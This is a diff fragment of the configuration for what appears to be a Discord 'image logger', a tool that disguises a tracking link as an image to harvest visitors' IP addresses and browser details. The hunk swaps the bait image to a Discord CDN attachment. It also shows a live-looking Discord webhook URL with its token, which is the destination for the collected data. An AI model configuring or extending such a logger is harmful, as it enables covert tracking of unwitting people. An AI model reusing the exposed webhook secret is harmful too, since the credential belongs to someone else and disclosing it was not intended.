@@ -4,7 +4,7 @@ import traceback, requests, base64, httpagentparser
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1371137301555445770/MSrngReWrAvEBk12YPxYfWhQtkxlF8TEBlBno9PQJd8piSggqiPklNxaEH3a164TLYa0",
-    "image": "https://media1.tenor.com/m/PnrRijZZBPUAAAAC/gay-holidays-gay-usa.gif", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1196181343198003313/1371534705148559560/image.png?ex=68237cbb&is=68222b3b&hm=ba0373d7cc2d82d503cfec0731b4ab9c4b9b65e71a3d4e2c33b32cd48888d95c&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
